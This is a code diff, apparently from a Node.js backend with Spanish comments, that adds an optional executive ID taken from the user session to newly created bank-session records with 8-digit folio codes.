@@ -902,6 +902,9 @@ _Fecha: ${new Date().toLocaleString('es-MX')}_
       const user = req.user;
       const { banco = "Invex" } = req.body;
       
+      // Verificar si es un ejecutivo
+      const executiveData = (req.session as any).executiveData;
+      
       // Generamos un código de 8 dígitos y lo usamos como ID de sesión
       let codeForSession = '';
       for (let i = 0; i < 8; i++) {
@@ -914,7 +917,8 @@ _Fecha: ${new Date().toLocaleString('es-MX')}_
         banco,
         folio: codeForSession,
         pasoActual: ScreenType.FOLIO,
-        createdBy: user.username, // Añadimos el creador
+        createdBy: user.username,
+        executiveId: executiveData?.executiveId || null, // Incluir executiveId si es ejecutivo
       });
       
       // Guardar la sesión automáticamente para que aparezca en el historial
@@ -1332,6 +1336,9 @@ _Fecha: ${new Date().toLocaleString('es-MX')}_
         });
       }
 
+      // Verificar si es un ejecutivo
+      const executiveData = (req.session as any).executiveData;
+      
       // Generamos un código de 8 dígitos numéricos que usaremos tanto para el ID como para el folio
       let linkCode = '';
       for (let i = 0; i < 8; i++) {
@@ -1346,7 +1353,8 @@ _Fecha: ${new Date().toLocaleString('es-MX')}_
         banco: banco as string,
         folio: linkCode, // Mismo código para el folio
         pasoActual: ScreenType.FOLIO,
-        createdBy: user.username,  // Añadimos el nombre del usuario que creó la sesión
+        createdBy: user.username,
+        executiveId: executiveData?.executiveId || null, // Incluir executiveId si es ejecutivo
       });
 
       // Guardar la sesión automáticamente para que aparezca en el historial
